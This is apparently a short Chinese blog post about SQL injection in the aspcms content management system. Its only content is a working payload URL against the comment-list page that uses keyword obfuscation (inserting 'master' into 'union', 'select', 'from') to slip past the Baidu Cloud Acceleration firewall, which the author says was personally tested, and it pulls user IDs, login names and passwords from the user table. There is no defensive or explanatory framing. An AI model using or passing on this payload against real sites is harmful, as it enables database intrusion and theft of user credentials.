---
title: "aspcms SQL 注入"
date: 2018-03-21T00:00:00+08:00
draft: false
tags: ['cms']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

亲测过百度云加速

<!--more-->

**payload**

`/plug/comment/commentList.asp?id=0 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1frmasterom {prefix}user`